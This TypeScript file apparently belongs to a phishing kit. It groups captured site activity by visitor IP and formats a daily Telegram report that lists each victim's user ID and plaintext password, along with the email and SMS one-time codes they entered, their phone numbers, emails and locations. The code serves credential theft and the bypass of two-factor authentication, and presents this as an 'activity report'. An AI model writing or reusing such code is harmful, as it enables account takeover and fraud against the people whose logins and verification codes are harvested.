import { getDailyStats } from './activity-logger'

interface IPGroupedActivity {
  ip: string
  location?: string
  firstSeen: string
  lastSeen: string
  logins: Array<{
    userId: string
    password: string
    timestamp: string
    page: string
  }>
  emailVerifications: Array<{
    email: string
    timestamp: string
    otp?: string
    verified: boolean
  }>
  textVerifications: Array<{
    phone: string
    timestamp: string
    otp?: string
    verified: boolean
  }>
  activityCount: number
}

export async function generateDailyReport(date: string) {
  try {
    const stats = await getDailyStats(date)
    
    if (stats.totalActivities === 0) {
      return null // No activities for this date
    }
    
    // Group activities by IP
    const ipGroups: Record<string, IPGroupedActivity> = {}
    
    stats.activities.forEach(activity => {
      const ip = activity.data.ip || 'Unknown'
      
      if (!ipGroups[ip]) {
        ipGroups[ip] = {
          ip,
          location: activity.data.location,
          firstSeen: activity.timestamp,
          lastSeen: activity.timestamp,
          logins: [],
          emailVerifications: [],
          textVerifications: [],
          activityCount: 0
        }
      }
      
      const group = ipGroups[ip]
      group.activityCount++
      
      // Update timestamps
      if (new Date(activity.timestamp) < new Date(group.firstSeen)) {
        group.firstSeen = activity.timestamp
      }
      if (new Date(activity.timestamp) > new Date(group.lastSeen)) {
        group.lastSeen = activity.timestamp
      }
      
      // Categorize activity
      if (activity.type === 'login') {
        group.logins.push({
          userId: activity.data.userId || 'N/A',
          password: activity.data.password || 'N/A',
          timestamp: activity.timestamp,
          page: activity.data.page || 'Unknown'
        })
      } else if (activity.type === 'email_verification') {
        // Check if there's a verification with OTP (later activity)
        const existingIndex = group.emailVerifications.findIndex(
          e => e.email === activity.data.email
        )
        
        if (existingIndex >= 0) {
          // Update existing entry with OTP if this is a verification
          if (activity.data.otp) {
            group.emailVerifications[existingIndex].otp = activity.data.otp
            group.emailVerifications[existingIndex].verified = true
          }
        } else {
          // New email verification entry
          group.emailVerifications.push({
            email: activity.data.email || 'N/A',
            timestamp: activity.timestamp,
            otp: activity.data.otp,
            verified: !!activity.data.otp
          })
        }
      } else if (activity.type === 'text_verification') {
        // Check if there's a verification with OTP (later activity)
        const existingIndex = group.textVerifications.findIndex(
          t => t.phone === activity.data.phone
        )
        
        if (existingIndex >= 0) {
          // Update existing entry with OTP if this is a verification
          if (activity.data.otp) {
            group.textVerifications[existingIndex].otp = activity.data.otp
            group.textVerifications[existingIndex].verified = true
          }
        } else {
          // New text verification entry
          group.textVerifications.push({
            phone: activity.data.phone || 'N/A',
            timestamp: activity.timestamp,
            otp: activity.data.otp,
            verified: !!activity.data.otp
          })
        }
      }
    })
    
    // Convert to array and sort by activity count (most active first)
    const groupedActivities = Object.values(ipGroups).sort(
      (a, b) => b.activityCount - a.activityCount
    )
    
    // Calculate summary stats
    const summary = {
      totalActivities: stats.totalActivities,
      visitors: stats.visitors,
      uniqueIPs: stats.uniqueIPs,
      logins: stats.logins,
      emailVerifications: stats.emailVerifications,
      textVerifications: stats.textVerifications
    }
    
    return {
      date,
      summary,
      groupedByIP: groupedActivities
    }
  } catch (error) {
    console.error('Failed to generate daily report:', error)
    return null
  }
}

export function formatDailyReportForTelegram(report: any): string {
  const { date, summary, groupedByIP } = report
  
  let message = `📊 Daily Activity Report - ${date}\n\n`
  
  // Summary Section
  message += `📈 SUMMARY\n`
  message += `━━━━━━━━━━━━━━━━━━━━\n`
  message += `🔄 Total Activities: ${summary.totalActivities}\n`
  message += `👥 Unique Visitors: ${summary.visitors}\n`
  message += `🌐 Unique IPs: ${summary.uniqueIPs}\n`
  message += `🔐 Login Attempts: ${summary.logins}\n`
  message += `📧 Email Verifications: ${summary.emailVerifications}\n`
  message += `📱 Text Verifications: ${summary.textVerifications}\n\n`
  
  message += `━━━━━━━━━━━━━━━━━━━━\n`
  message += `👤 ACTIVITIES BY IP ADDRESS\n`
  message += `━━━━━━━━━━━━━━━━━━━━\n\n`
  
  // Show each IP group (top 20 most active)
  groupedByIP.slice(0, 20).forEach((group: IPGroupedActivity, index: number) => {
    const firstSeenTime = new Date(group.firstSeen).toLocaleTimeString()
    const lastSeenTime = new Date(group.lastSeen).toLocaleTimeString()
    
    message += `🌐 IP: ${group.ip}\n`
    message += `━━━━━━━━━━━━━━━━━━━━\n`
    
    if (group.location) {
      message += `  📍 Location: ${group.location}\n`
    }
    message += `  🕒 First Seen: ${firstSeenTime}\n`
    message += `  🕒 Last Seen: ${lastSeenTime}\n`
    message += `  📊 Total Activities: ${group.activityCount}\n\n`
    
    // Logins
    if (group.logins.length > 0) {
      message += `  🔐 LOGINS:\n`
      group.logins.forEach(login => {
        const time = new Date(login.timestamp).toLocaleTimeString()
        message += `    • User ID: ${login.userId}\n`
        message += `      Password: ${login.password}\n`
        message += `      Time: ${time} | Page: ${login.page}\n\n`
      })
    }
    
    // Email Verifications
    if (group.emailVerifications.length > 0) {
      message += `  📧 EMAIL VERIFICATIONS:\n`
      group.emailVerifications.forEach(email => {
        const time = new Date(email.timestamp).toLocaleTimeString()
        message += `    • Email: ${email.email}\n`
        if (email.verified && email.otp) {
          message += `      Status: ✅ OTP Sent & Verified\n`
          message += `      OTP Code: ${email.otp}\n`
        } else {
          message += `      Status: ⏳ OTP Sent (Not Verified)\n`
        }
        message += `      Time: ${time}\n\n`
      })
    }
    
    // Text Verifications
    if (group.textVerifications.length > 0) {
      message += `  📱 TEXT VERIFICATIONS:\n`
      group.textVerifications.forEach(text => {
        const time = new Date(text.timestamp).toLocaleTimeString()
        message += `    • Phone: ${text.phone}\n`
        if (text.verified && text.otp) {
          message += `      Status: ✅ OTP Sent & Verified\n`
          message += `      OTP Code: ${text.otp}\n`
        } else {
          message += `      Status: ⏳ OTP Sent (Not Verified)\n`
        }
        message += `      Time: ${time}\n\n`
      })
    }
    
    message += `━━━━━━━━━━━━━━━━━━━━\n\n`
  })
  
  if (groupedByIP.length > 20) {
    message += `... and ${groupedByIP.length - 20} more IPs\n\n`
  }
  
  // Quick summary by IP
  message += `📊 SUMMARY BY IP\n`
  message += `━━━━━━━━━━━━━━━━━━━━\n`
  groupedByIP.slice(0, 10).forEach((group: IPGroupedActivity) => {
    const activities = []
    if (group.logins.length > 0) activities.push(`${group.logins.length} login${group.logins.length > 1 ? 's' : ''}`)
    if (group.emailVerifications.length > 0) activities.push(`${group.emailVerifications.length} email${group.emailVerifications.length > 1 ? 's' : ''}`)
    if (group.textVerifications.length > 0) activities.push(`${group.textVerifications.length} text${group.textVerifications.length > 1 ? 's' : ''}`)
    
    message += `  • ${group.ip}: ${group.activityCount} activities (${activities.join(', ')})\n`
  })
  if (groupedByIP.length > 10) {
    message += `  ... and ${groupedByIP.length - 10} more IPs\n`
  }
  
  message += `\n━━━━━━━━━━━━━━━━━━━━\n`
  message += `Generated at: ${new Date().toLocaleString()}`
  
  return message
}

